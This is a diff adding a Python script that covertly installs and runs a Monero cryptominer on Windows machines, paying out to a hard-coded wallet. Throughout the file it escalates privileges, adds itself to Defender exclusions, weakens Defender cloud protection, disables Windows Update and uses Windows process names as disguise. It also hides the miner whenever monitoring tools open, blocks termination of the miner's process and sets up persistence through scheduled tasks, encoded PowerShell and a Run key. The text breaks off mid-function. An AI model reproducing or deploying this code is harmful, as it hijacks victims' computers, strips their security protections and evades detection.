@@ -1,0 +1,965 @@
+import ctypes, os, sys, subprocess, json, sqlite3, configparser, random, datetime, urllib.request, urllib.error, winreg, logging, traceback, time, zipfile, shutil, tempfile, string, base64, ssl, requests
+from urllib.parse import quote
+import io
+from pathlib import Path
+import psutil
+import threading
+
+SSL_CONTEXT = ssl.create_default_context()
+
+# ===== USER SETTINGS =====
+WALLET_ADDRESS = "49Xmz3gDf3jZaSWMGJV5Fq3LhGvPLJk3nwn2RoHtmh8vw5vMhGknq1j5eFq6bKZ1LBs1HT4P3J4u2s5yXJ3G9cV6"   # <--- SET YOUR MONERO WALLET ADDRESS
+EXE_NAME = "who my pie"   # the name of the miner executable without .exe (already on disk)
+# ============================================================
+
+DEBUG_MODE = True
+ENABLE_PERSISTENCE = True
+TESTING_MODE = True
+hawk = logging.getLogger('hawk')
+hawk.setLevel(logging.DEBUG)
+formatter = logging.Formatter('%(asctime)s|%(levelname)s|%(message)s')
+ch = logging.StreamHandler()
+ch.setLevel(logging.DEBUG)
+ch.setFormatter(formatter)
+hawk.addHandler(ch)
+
+def global_exception_handler(exc_type, exc_value, exc_traceback):
+    if issubclass(exc_type, KeyboardInterrupt):
+        sys.__excepthook__(exc_type, exc_value, exc_traceback)
+        return
+    hawk.critical("Unhandled exception:", exc_info=(exc_type, exc_value, exc_traceback))
+    for h in hawk.handlers:
+        h.flush()
+    if sys.stdin and sys.stdin.isatty():
+        input("\nPress Enter to exit...")
+    sys.exit(999)
+
+sys.excepthook = global_exception_handler
+
+ERR = {
+    'RAM_LOW': 101, 'SUSPICIOUS_USERNAME': 102, 'AV_PROCESS_FOUND': 201, 'TOOL_PROCESS_FOUND': 202,
+    'AV_SOFTWARE_FOUND': 301, 'TOOL_SOFTWARE_FOUND': 302, 'GEO_FAIL': 401, 'PS_HISTORY_LARGE': 501,
+    'PS_RISKY_COMMANDS': 502, 'LOW_BROWSER_APP_CLUSTER': 601, 'ELEVATION_LOOP': 801, 'UNEXPECTED': 999
+}
+
+def trigger_exit(code, reason):
+    hawk.critical(f"TRIGGER_EXIT|code={code}|reason={reason}")
+    for h in hawk.handlers:
+        h.flush()
+    if sys.stdin and sys.stdin.isatty():
+        hawk.info("Press Enter to exit...")
+        input("\n>>> Script will exit now. Press Enter to close this window.")
+    sys.exit(0)
+
+def is_admin():
+    try: return ctypes.windll.shell32.IsUserAnAdmin() != 0
+    except: return False
+
+def elevate():
+    if is_admin(): return
+    if os.environ.get('__ELEVATED_ATTEMPT__') == '1':
+        hawk.critical("Elevation loop detected")
+        trigger_exit(ERR['ELEVATION_LOOP'], "UAC disabled or elevation failed twice")
+    os.environ['__ELEVATED_ATTEMPT__'] = '1'
+    script = os.path.abspath(sys.argv[0])
+    params = ' '.join(f'"{a}"' for a in sys.argv[1:])
+    ret = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
+    if ret <= 32:
+        hawk.critical(f"Elevation failed with error code {ret}")
+        if DEBUG_MODE:
+            if sys.stdin and sys.stdin.isatty():
+                input("UAC elevation failed. Please run this script as administrator. Press Enter to exit.")
+        trigger_exit(ERR['ELEVATION_LOOP'], f"ShellExecute error {ret}")
+    if sys.stdin and sys.stdin.isatty():
+        input("Elevation requested. The script is now restarting as admin. Press Enter to close this window.")
+    sys.exit(0)
+
+def add_self_to_defender_exclusions():
+    hawk.info("[EXCLUSION] adding script to Defender exclusions")
+    try:
+        script_path = os.path.abspath(sys.argv[0])
+        cmd = f'Add-MpPreference -ExclusionPath "{script_path}"'
+        subprocess.run(['powershell', '-Command', cmd], capture_output=True, shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
+        hawk.info("[EXCLUSION] done")
+    except Exception as e:
+        hawk.error(f"[EXCLUSION] failed: {e}", exc_info=True)
+
+def add_folder_to_defender_exclusions(path):
+    hawk.info(f"[EXCLUSION] adding folder {path} to Defender exclusions")
+    try:
+        cmd = f'Add-MpPreference -ExclusionPath "{path}"'
+        subprocess.run(['powershell', '-Command', cmd], capture_output=True, shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
+        hawk.info(f"[EXCLUSION] folder {path} added")
+    except Exception as e:
+        hawk.error(f"[EXCLUSION] folder exclusion failed: {e}", exc_info=True)
+
+def is_pe_file(path):
+    try:
+        with open(path, 'rb') as f:
+            if f.read(2) != b'MZ':
+                return False
+            f.seek(0x3C)
+            pe_offset = int.from_bytes(f.read(4), byteorder='little')
+            f.seek(pe_offset)
+            if f.read(4) != b'PE\x00\x00':
+                return False
+        return True
+    except:
+        return False
+
+LEGIT_NAMES = [
+    "WmiPrvSE.exe",
+    "RuntimeBroker.exe",
+    "SearchIndexer.exe",
+    "sihost.exe",
+    "taskhostw.exe",
+    "ctfmon.exe",
+    "dllhost.exe",
+    "fontdrvhost.exe",
+    "spoolsv.exe",
+    "WinSAT.exe",
+    "audiodg.exe",
+    "wlanext.exe",
+    "conhost.exe",
+    "mobsync.exe",
+    "ShellExperienceHost.exe",
+    "StartMenuExperienceHost.exe",
+    "SystemSettings.exe",
+    "Taskmgr.exe",
+    "LogonUI.exe",
+    "sppsvc.exe",
+    "wlidsvc.exe",
+    "wuauclt.exe",
+    "wermgr.exe",
+    "wsqmcons.exe",
+    "unsecapp.exe",
+    "VSSVC.exe",
+    "TrustedInstaller.exe",
+    "TiWorker.exe",
+    "taskeng.exe",
+    "SynTPEnh.exe",
+    "svchost.exe",
+    "stacsv64.exe",
+    "spellcheckinghost.exe",
+    "smss.exe",
+    "SgrmBroker.exe",
+    "SettingSyncHost.exe",
+    "SecurityHealthService.exe",
+    "SearchProtocolHost.exe",
+    "SearchFilterHost.exe",
+    "rundll32.exe",
+    "RegSvcs.exe",
+    "PickerHost.exe",
+    "perfmon.exe",
+    "OpenWith.exe",
+    "OfficeClickToRun.exe",
+    "mstsc.exe",
+    "msiexec.exe",
+    "mshta.exe",
+    "mpnotify.exe",
+    "LockApp.exe",
+    "LocationNotificationWindows.exe",
+    "lltdsvc.exe",
+    "LdapSvc.exe",
+    "InputSwitchToastHandler.exe",
+    "igfxCUIService.exe",
+    "HxTsr.exe",
+    "HxOutlook.exe",
+    "HxAccounts.exe",
+    "HelpPane.exe",
+    "HealthAttestationService.exe",
+    "GraphicsPerfSvc.exe",
+    "FileHistory.exe",
+    "explorer.exe",
+    "dwm.exe",
+    "dpisearch.exe",
+    "DeviceCensus.exe",
+    "dasHost.exe",
+    "CredentialUIBroker.exe",
+    "cscript.exe",
+    "CompPkgSrv.exe",
+    "CertEnrollCtrl.exe",
+    "bthudtask.exe",
+    "biwinrt.exe",
+    "bcastdvr.exe",
+    "aitagent.exe",
+    "wlrmdr.exe",
+    "Winlogon.exe",
+    "WmiApSrv.exe",
+    "Wlclntfy.exe",
+    "wfs.exe",
+    "websocketd.exe",
+    "wcncsvc.exe",
+    "walletproxyhost.exe",
+    "w32time.exe",
+    "vssadmin.exe",
+    "vds.exe",
+    "usocoreworker.exe",
+    "upnpcont.exe",
+    "unregmp2.exe",
+    "TpmInit.exe",
+    "tracerpt.exe",
+    "SystemSettingsThresholdAdminFlows.exe",
+    "SpeechModelDownload.exe",
+    "RstMwService.exe",
+    "DWWIN.EXE",
+    "eudcedit.exe",
+    "BioIso.exe",
+    "audiotel.exe",
+    "AppVClient.exe",
+    "AnytimeUpgradeResults.exe",
+    "agentactivationruntimestarter.exe",
+    "csrss.exe",
+    "wininit.exe",
+    "services.exe",
+    "lsass.exe",
+    "MsMpEng.exe",
+    "NisSrv.exe",
+    "wscript.exe",
+    "regsvr32.exe",
+    "StartMenuExperienceHost.exe",
+    "SystemSettingsThresholdAdminFlows.exe",
+    "VSSVC.exe",
+    "Winlogon.exe",
+    "csrss.exe",
+    "wininit.exe",
+    "services.exe",
+    "lsass.exe",
+    "svchost.exe",
+    "spoolsv.exe",
+    "winlogon.exe",
+    "LogonUI.exe",
+    "dwm.exe",
+    "taskhostw.exe",
+    "sihost.exe",
+    "RuntimeBroker.exe",
+    "ShellExperienceHost.exe",
+    "SearchIndexer.exe",
+    "WmiPrvSE.exe",
+    "smss.exe",
+    "SystemSettings.exe",
+    "SecurityHealthService.exe",
+    "MsMpEng.exe",
+    "NisSrv.exe",
+    "vds.exe",
+    "audiodg.exe",
+    "wlanext.exe",
+    "conhost.exe",
+    "mobsync.exe",
+    "spellcheckinghost.exe",
+    "SettingSyncHost.exe",
+    "SearchProtocolHost.exe",
+    "SearchFilterHost.exe",
+    "rundll32.exe",
+    "explorer.exe",
+    "dwm.exe",
+    "OfficeClickToRun.exe",
+    "msiexec.exe",
+    "mshta.exe",
+    "mstsc.exe",
+    "cscript.exe",
+    "wscript.exe",
+    "regsvr32.exe",
+    "bthudtask.exe",
+    "DeviceCensus.exe",
+    "CompPkgSrv.exe",
+    "PickerHost.exe",
+    "LockApp.exe",
+    "LocationNotificationWindows.exe",
+    "InputSwitchToastHandler.exe",
+    "CredentialUIBroker.exe",
+    "dasHost.exe",
+    "dpisearch.exe",
+    "FileHistory.exe",
+    "GraphicsPerfSvc.exe",
+    "HealthAttestationService.exe",
+    "HelpPane.exe",
+    "HxTsr.exe",
+    "HxOutlook.exe",
+    "HxAccounts.exe",
+    "igfxCUIService.exe",
+    "lltdsvc.exe",
+    "LdapSvc.exe",
+    "perfmon.exe",
+    "OpenWith.exe",
+    "RegSvcs.exe",
+    "Taskmgr.exe",
+    "TpmInit.exe",
+    "tracerpt.exe",
+    "unsecapp.exe",
+    "upnpcont.exe",
+    "usocoreworker.exe",
+    "vssadmin.exe",
+    "w32time.exe",
+    "walletproxyhost.exe",
+    "wcncsvc.exe",
+    "wermgr.exe",
+    "wlrmdr.exe",
+    "wlidsvc.exe",
+    "wsqmcons.exe",
+    "wuauclt.exe",
+    "wfs.exe",
+    "WinSAT.exe",
+    "Wlclntfy.exe",
+    "WmiApSrv.exe",
+    "TrustedInstaller.exe",
+    "TiWorker.exe",
+    "taskeng.exe",
+    "SynTPEnh.exe",
+    "stacsv64.exe",
+    "smss.exe",
+    "SgrmBroker.exe",
+    "SpeechModelDownload.exe",
+    "RstMwService.exe",
+    "DWWIN.EXE",
+    "eudcedit.exe",
+    "BioIso.exe",
+    "audiotel.exe",
+    "AppVClient.exe",
+    "AnytimeUpgradeResults.exe",
+    "agentactivationruntimestarter.exe",
+    "aitagent.exe",
+    "bcastdvr.exe",
+    "biwinrt.exe",
+    "bthudtask.exe",
+    "CertEnrollCtrl.exe",
+    "CompPkgSrv.exe",
+    "cscript.exe",
+    "dasHost.exe",
+    "DeviceCensus.exe",
+    "dpisearch.exe",
+    "dwm.exe",
+    "eudcedit.exe",
+    "explorer.exe",
+    "FileHistory.exe",
+    "fontdrvhost.exe",
+    "GraphicsPerfSvc.exe",
+    "HealthAttestationService.exe",
+    "HelpPane.exe",
+    "HxAccounts.exe",
+    "HxOutlook.exe",
+    "HxTsr.exe",
+    "igfxCUIService.exe",
+    "InputSwitchToastHandler.exe",
+    "LdapSvc.exe",
+    "lltdsvc.exe",
+    "LockApp.exe",
+    "LocationNotificationWindows.exe",
+    "LogonUI.exe",
+    "mobsync.exe",
+    "mpnotify.exe",
+    "mshta.exe",
+    "msiexec.exe",
+    "mstsc.exe",
+    "OfficeClickToRun.exe",
+    "OpenWith.exe",
+    "perfmon.exe",
+    "PickerHost.exe",
+    "RegSvcs.exe",
+    "rundll32.exe",
+    "SearchFilterHost.exe",
+    "SearchIndexer.exe",
+    "SearchProtocolHost.exe",
+    "SecurityHealthService.exe",
+    "SettingSyncHost.exe",
+    "SgrmBroker.exe",
+    "ShellExperienceHost.exe",
+    "sihost.exe",
+    "smss.exe",
+    "SpeechModelDownload.exe",
+    "spellcheckinghost.exe",
+    "spoolsv.exe",
+    "sppsvc.exe",
+    "stacsv64.exe",
+    "StartMenuExperienceHost.exe",
+    "svchost.exe",
+    "SynTPEnh.exe",
+    "SystemSettings.exe",
+    "SystemSettingsThresholdAdminFlows.exe",
+    "taskeng.exe",
+    "taskhostw.exe",
+    "Taskmgr.exe",
+    "TiWorker.exe",
+    "TpmInit.exe",
+    "tracerpt.exe",
+    "TrustedInstaller.exe",
+    "unsecapp.exe",
+    "upnpcont.exe",
+    "usocoreworker.exe",
+    "VSSVC.exe",
+    "vssadmin.exe",
+    "vds.exe",
+    "w32time.exe",
+    "walletproxyhost.exe",
+    "wcncsvc.exe",
+    "wermgr.exe",
+    "wfs.exe",
+    "Winlogon.exe",
+    "WinSAT.exe",
+    "Wlclntfy.exe",
+    "WmiApSrv.exe",
+    "WmiPrvSE.exe",
+    "wsqmcons.exe",
+    "wuauclt.exe",
+    "wuauclt.exe",
+    "wlidsvc.exe",
+    "wlrmdr.exe",
+    "wscript.exe",
+    "websocketd.exe",
+    "RstMwService.exe"
+]
+LEGIT_NAMES.append("WindowsSecurityHelper.exe")
+LEGIT_NAMES = list(set(LEGIT_NAMES))
+
+LOCK_PATHS = [
+    os.path.join(os.environ.get('ProgramData', 'C:\\ProgramData'), 'Microsoft', 'Windows', 'Caches', 'lock_0.dat'),
+    os.path.join(os.environ.get('ProgramData', 'C:\\ProgramData'), 'Microsoft', 'Windows', 'WER', 'lock_1.dat'),
+    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'Themes', 'lock_2.dat'),
+    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'Notifications', 'lock_3.dat'),
+    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'CloudStore', 'lock_4.dat'),
+    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'Recent', 'lock_5.dat'),
+    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'INetCache', 'IE', 'lock_6.dat'),
+    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'SendTo', 'lock_7.dat'),
+    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'Burn', 'Burn', 'lock_8.dat'),
+    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'lock_9.dat'),
+    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'History', 'lock_10.dat'),
+    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'Libraries', 'lock_11.dat'),
+    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'Roaming', 'Tiles', 'lock_12.dat'),
+    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'Templates', 'lock_13.dat'),
+    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'Themes', 'lock_14.dat'),
+    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'Cookies', 'lock_15.dat'),
+    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'AppCache', 'lock_16.dat'),
+    os.path.join(os.environ.get('ProgramData', 'C:\\ProgramData'), 'Microsoft', 'Windows', 'Caches', 'lock_17.dat'),
+    os.path.join(os.environ.get('ProgramData', 'C:\\ProgramData'), 'Microsoft', 'Windows', 'WER', 'lock_18.dat'),
+    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'Themes', 'lock_19.dat'),
+    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'Notifications', 'lock_20.dat'),
+    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'CloudStore', 'lock_21.dat'),
+    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'Recent', 'lock_22.dat'),
+    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'INetCache', 'IE', 'lock_23.dat'),
+    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'SendTo', 'lock_24.dat'),
+    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'Burn', 'Burn', 'lock_25.dat'),
+    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'lock_26.dat'),
+    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'History', 'lock_27.dat'),
+    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'Libraries', 'lock_28.dat'),
+    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'Roaming', 'Tiles', 'lock_29.dat'),
+    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'Templates', 'lock_30.dat'),
+    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'Themes', 'lock_31.dat'),
+    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'Cookies', 'lock_32.dat'),
+    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'AppCache', 'lock_33.dat'),
+    os.path.join(os.environ.get('ProgramData', 'C:\\ProgramData'), 'Microsoft', 'Windows', 'Caches', 'lock_34.dat'),
+    os.path.join(os.environ.get('ProgramData', 'C:\\ProgramData'), 'Microsoft', 'Windows', 'WER', 'lock_35.dat'),
+    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'Themes', 'lock_36.dat'),
+    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'Notifications', 'lock_37.dat'),
+    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'CloudStore', 'lock_38.dat'),
+    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'Recent', 'lock_39.dat'),
+]
+
+def disable_defender_cloud():
+    hawk.info("[DEFENDER_DISABLE] start")
+    try:
+        spynet_path = r"SOFTWARE\Policies\Microsoft\Windows Defender\Spynet"
+        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, spynet_path)
+        winreg.SetValueEx(key, "SpynetReporting", 0, winreg.REG_DWORD, 0)
+        winreg.SetValueEx(key, "SubmitSamplesConsent", 0, winreg.REG_DWORD, 2)
+        winreg.SetValueEx(key, "DisableBlockAtFirstSeen", 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(key)
+        subprocess.run('gpupdate /force', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run('sc stop WinDefend', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run('sc start WinDefend', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        hawk.info("[DEFENDER_DISABLE] done")
+    except Exception as e:
+        hawk.error(f"[DEFENDER_DISABLE] failed: {e}", exc_info=True)
+
+def disable_windows_updates():
+    hawk.info("[WIN_UPDATE_DISABLE] start")
+    try:
+        au_path = r"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"
+        try:
+            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, au_path, 0, winreg.KEY_READ)
+            current_value, _ = winreg.QueryValueEx(key, "NoAutoUpdate")
+            winreg.CloseKey(key)
+            if current_value == 1:
+                hawk.info("[WIN_UPDATE_DISABLE] already disabled via policy")
+                subprocess.run('sc stop wuauserv', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+                subprocess.run('sc config wuauserv start= disabled', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+                return
+        except FileNotFoundError:
+            pass
+        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, au_path)
+        winreg.SetValueEx(key, "NoAutoUpdate", 0, winreg.REG_DWORD, 1)
+        winreg.SetValueEx(key, "AUOptions", 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(key)
+        subprocess.run('sc stop wuauserv', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run('sc config wuauserv start= disabled', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        hawk.info("[WIN_UPDATE_DISABLE] Windows Update disabled via policy and service stopped")
+    except Exception as e:
+        hawk.error(f"[WIN_UPDATE_DISABLE] failed: {e}", exc_info=True)
+
+def find_miner_exe():
+    """Recursively search common locations for who my pie.exe"""
+    hawk.info("[FIND_MINER] searching for miner executable")
+    search_roots = [
+        os.environ.get('LOCALAPPDATA', ''),
+        os.environ.get('APPDATA', ''),
+        os.environ.get('ProgramData', '')
+    ]
+    for root in search_roots:
+        if not root:
+            continue
+        for dirpath, dirnames, filenames in os.walk(root):
+            # Limit depth to avoid scanning entire drive (max 4 levels deep)
+            depth = dirpath.replace(root, '').count(os.sep)
+            if depth > 4:
+                dirnames.clear()  # stop deeper recursion
+            for f in filenames:
+                if f.lower() == f"{EXE_NAME.lower()}.exe":
+                    full_path = os.path.join(dirpath, f)
+                    hawk.info(f"[FIND_MINER] found: {full_path}")
+                    return full_path
+    hawk.error("[FIND_MINER] miner exe not found")
+    return None
+
+def check_previous_deployment():
+    """Read lock files to find previously deployed miner and config."""
+    for lp in LOCK_PATHS:
+        if os.path.isfile(lp):
+            try:
+                with open(lp, 'r') as f:
+                    lines = f.read().strip().splitlines()
+                    if len(lines) >= 1:
+                        exe_path = lines[0].strip()
+                        config_dir = lines[1].strip() if len(lines) >= 2 else os.path.dirname(exe_path)
+                        if os.path.isfile(exe_path) and os.path.isdir(config_dir):
+                            hawk.info(f"[CHECK_DEPLOY] Found previous deployment: {exe_path}")
+                            return exe_path, config_dir
+            except:
+                pass
+    return None, None
+
+def generate_config(config_dir, threads=None):
+    hawk.info("[CONFIG] generating config.json")
+    if threads is None:
+        cpu_count = os.cpu_count() or 4
+        threads = max(1, round(cpu_count * 0.15))
+    hawk.debug(f"[CONFIG] using {threads} threads")
+    config = {
+        "autosave": True,
+        "cpu": {
+            "enabled": True,
+            "max-threads-hint": threads,
+            "priority": 1
+        },
+        "pools": [
+            {
+                "url": "pool.supportxmr.com:3333",
+                "user": WALLET_ADDRESS,
+                "pass": "x",
+                "keepalive": True,
+                "tls": False
+            }
+        ]
+    }
+    config_path = os.path.join(config_dir, "config.json")
+    try:
+        with open(config_path, 'w') as cf:
+            json.dump(config, cf, indent=2)
+        hawk.info(f"[CONFIG] written to {config_path}")
+    except Exception as e:
+        hawk.error(f"[CONFIG] write failed: {e}", exc_info=True)
+
+def protect_process(pid):
+    try:
+        import win32security, win32api, win32process
+    except ImportError:
+        hawk.warning("[PROCESS_PROTECT] pywin32 not installed, skipping ACL protection")
+        return
+    try:
+        hProcess = win32api.OpenProcess(win32process.PROCESS_SET_SECURITY, False, pid)
+        admins, _, _ = win32security.LookupAccountName("", "Administrators")
+        system, _, _ = win32security.LookupAccountName("", "SYSTEM")
+        dacl = win32security.ACL()
+        dacl.AddAccessAllowedAce(win32security.ACL_REVISION, win32process.PROCESS_TERMINATE, admins)
+        dacl.AddAccessAllowedAce(win32security.ACL_REVISION, win32process.PROCESS_TERMINATE, system)
+        win32security.SetSecurityInfo(hProcess, win32security.SE_KERNEL_OBJECT,
+                                      win32security.DACL_SECURITY_INFORMATION,
+                                      None, None, dacl, None)
+        hawk.info("[PROCESS_PROTECT] only admins/system can terminate miner")
+    except Exception as e:
+        hawk.error(f"[PROCESS_PROTECT] failed: {e}")
+
+class MinerWatchdog:
+    def __init__(self, exe_path, config_dir, base_threads=None):
+        self.exe_path = exe_path
+        self.config_dir = config_dir
+        self.config_path = os.path.join(config_dir, 'config.json')
+        self.base_threads = base_threads or max(1, round(os.cpu_count() * 0.15))
+        self.current_threads = self.base_threads
+        self.miner_proc = None
+        self.running = True
+        self.lock = threading.Lock()
+
+    def start(self):
+        """Launch the miner and start the watchdog thread."""
+        self._launch_miner()
+        threading.Thread(target=self._watchdog_loop, daemon=True).start()
+
+    def _launch_miner(self):
+        if self.miner_proc and self.miner_proc.poll() is None:
+            self.miner_proc.terminate()
+            self.miner_proc.wait()
+        # update config with current threads
+        try:
+            config = json.load(open(self.config_path))
+        except:
+            hawk.warning("[WATCHDOG] config missing or corrupted, regenerating")
+            generate_config(self.config_dir, self.current_threads)
+            config = json.load(open(self.config_path))
+        config['cpu']['max-threads-hint'] = self.current_threads
+        with open(self.config_path, 'w') as f:
+            json.dump(config, f, indent=2)
+        # start miner (visible console for now)
+        self.miner_proc = subprocess.Popen(
+            [self.exe_path, "--stress", f"--config={self.config_path}"],
+            creationflags=subprocess.CREATE_NEW_CONSOLE
+        )
+        protect_process(self.miner_proc.pid)
+        hawk.info(f"[WATCHDOG] miner launched with {self.current_threads} threads, PID {self.miner_proc.pid}")
+
+    def _check_for_snooping(self):
+        SUSPICIOUS_PROCS = {'taskmgr.exe', 'procexp.exe', 'perfmon.exe', 'resmon.exe', 'procmon.exe', 'processhacker.exe'}
+        try:
+            for proc in psutil.process_iter(['name']):
+                if proc.info['name'] and proc.info['name'].lower() in SUSPICIOUS_PROCS:
+                    return True
+        except:
+            pass
+        return False
+
+    def _watchdog_loop(self):
+        while self.running:
+            # Check if miner is alive; if not, restart
+            if self.miner_proc.poll() is not None:
+                hawk.warning("[WATCHDOG] Miner crashed, restarting")
+                self._launch_miner()
+
+            # Check for user snooping
+            if self._check_for_snooping():
+                hawk.critical("[WATCHDOG] User snooping detected! Stopping miner until next reboot.")
+                if self.miner_proc and self.miner_proc.poll() is None:
+                    self.miner_proc.terminate()
+                # Write a flag file
+                flag_path = os.path.join(tempfile.gettempdir(), 'miner_paused.flag')
+                with open(flag_path, 'w') as f:
+                    f.write('1')
+                self.running = False
+                break
+
+            # CPU usage check (average over 2 seconds)
+            cpu_percent = psutil.cpu_percent(interval=2)
+            if cpu_percent > 80 and self.current_threads > 1:
+                # too high -> reduce threads
+                self.current_threads = max(1, self.current_threads - 1)
+                hawk.info(f"[WATCHDOG] CPU high ({cpu_percent}%), reducing threads to {self.current_threads}")
+                self._launch_miner()
+            elif cpu_percent < 40 and self.current_threads < self.base_threads * 2:
+                # too low -> increase threads (but not more than 2x base)
+                self.current_threads += 1
+                hawk.info(f"[WATCHDOG] CPU low ({cpu_percent}%), increasing threads to {self.current_threads}")
+                self._launch_miner()
+
+            time.sleep(10)  # check every 10 seconds
+
+def create_scheduled_task():
+    if not ENABLE_PERSISTENCE:
+        hawk.info("[PERSISTENCE] disabled")
+        return
+    hawk.info("[PERSISTENCE] creating logon scheduled task for watchdog script")
+    try:
+        task_name = "WindowsHelperTask"
+        script_path = os.path.abspath(sys.argv[0])
+        python_exe = sys.executable
+        subprocess.run([
+            'schtasks', '/create', '/tn', task_name,
+            '/tr', f'"{python_exe}" "{script_path}"',
+            '/sc', 'onlogon', '/rl', 'HIGHEST', '/f'
+        ], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        hawk.info("[PERSISTENCE] logon task created")
+    except Exception as e:
+        hawk.error(f"[PERSISTENCE] logon task failed: {e}", exc_info=True)
+
+    hawk.info("[PERSISTENCE] creating watchdog scheduled task (runs every 5 minutes)")
+    try:
+        task_name_watchdog = "WindowsHelperWatchdog"
+        script_path = os.path.abspath(sys.argv[0])
+        python_exe = sys.executable
+        ps_script = f'''$proc = Get-Process -Name python | Where-Object {{ $_.Path -eq '{python_exe}' }} | Select-Object -First 1; if (-not $proc) {{ Start-Process -FilePath '{python_exe}' -ArgumentList '"{script_path}"' -WindowStyle Hidden }}'''
+        b64 = base64.b64encode(ps_script.encode('utf-16le')).decode()
+        subprocess.run([
+            'schtasks', '/create', '/tn', task_name_watchdog,
+            '/tr', f'powershell -EncodedCommand {b64}',
+            '/sc', 'minute', '/mo', '5', '/rl', 'HIGHEST', '/f'
+        ], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        hawk.info("[PERSISTENCE] watchdog task created")
+    except Exception as e:
+        hawk.error(f"[PERSISTENCE] watchdog task failed: {e}", exc_info=True)
+
+def add_persistence_multi():
+    script_path = os.path.abspath(sys.argv[0])
+    python_exe = sys.executable
+    target = f'"{python_exe}" "{script_path}"'
+
+    try:
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
+        winreg.SetValueEx(key, "WindowsHelper", 0, winreg.REG_SZ, target)
+        winreg.CloseKey(key)
